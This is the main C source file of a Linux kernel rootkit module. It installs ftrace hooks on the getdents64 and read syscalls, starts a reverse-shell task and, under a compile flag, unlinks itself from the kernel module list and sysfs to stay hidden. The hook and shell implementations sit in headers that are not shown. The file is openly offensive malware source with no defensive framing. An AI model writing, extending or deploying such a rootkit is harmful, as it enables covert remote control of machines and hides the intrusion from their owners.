
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kobject.h>

#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"
#include "hooks/x64_sys_read.h"


#include "tasks/task_manager.h"
#include "tasks/reverse_shell.h"


// define which tasks to run
static struct k_task tasks[] = {
    k_task(&rshell_func, NULL),
};

// define which functions to hook
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init rootkit_init(void) {
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    err = run_tasks(tasks, ARRAY_SIZE(tasks));
    if (err) {
        return err;
    }

#ifdef HIDE_MODULE
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

    return 0;
}


// cleanup: restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    stop_tasks(tasks, ARRAY_SIZE(tasks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
